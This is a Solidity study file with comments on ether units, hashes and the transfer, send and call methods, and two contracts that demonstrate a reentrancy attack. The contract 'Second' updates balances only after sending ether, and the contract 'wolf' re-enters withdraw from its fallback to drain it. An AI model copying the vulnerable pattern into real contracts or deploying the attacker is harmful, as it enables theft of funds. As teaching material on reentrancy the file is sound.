//// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

/* 

    token coin difference 
    If it has its own blockchain, then it's a coin, and if it operates on an existing blockchain, then it's a token 

    1 Ether = 1 Ether
    1 Ether = 10^9 / 10**9 Gwei -> only use second way
    1 Ether = 10^18 / 10**18 Wei
    hash -> password , 256 bit , a function that meets the encrypted demands needed to solve for a blockchain computation, if we change even one character whole hash changes

    result = number1 + result ; is the same thing with result += number1;
    msg.sender = the addres of message
    msg.value = the value of message

    Transfer (2300 gas) , throws error , gas is limited for preventing reentrancy attacks
    Send  (2300 gas) return bool, gas is limited for preventing reentrancy attacks
    Call  (gas limit can be defined),return bool + data ,gas is not limited so vulnerable for reentrancy attacks-> reccomended way to send eth
    (bool sent , bytes memory data) = targetAddress.call{value:1000, gas: 10000}("function changeName(string) , "Yeni İsim" "); 
    Data : It returns the value of the function which we decleare in parentheses of call. Here it will return the value of changeName function. 
   
    
    */
 contract Second {
    mapping(address => uint) balances;

    function sendToContract() public payable {
        balances[address(msg.sender)] += msg.value;
    }

    function send(uint amount, address payable targetAddress) public payable {
        amount = amount * (10 ** 18);
        (bool isTrue, ) = targetAddress.call{value: amount}("");
        balances[targetAddress] += amount;
    }

    function withdraw() public payable {
        require(balances[msg.sender] > 0, "not enough money");
        uint amount2 = balances[msg.sender];
        (bool done, ) = msg.sender.call{value: amount2}("");
        balances[msg.sender] = 0; //normaly we should change before call function 
    }

    function reader(address _address) public view returns (uint) {
        return (balances[_address]);
    }
}

contract wolf {
    Second s1;

    constructor(address enemyContract) {
        s1 = Second(enemyContract);
    }

    function fund() public payable {}

    function attack(uint amountToSend) public payable {
        amountToSend = amountToSend * (10 ** 18);
        s1.sendToContract{value: amountToSend}();
    }

    function destroy() public payable {
        s1.withdraw();
    }

    fallback() external payable {
        s1.withdraw();
    }
}
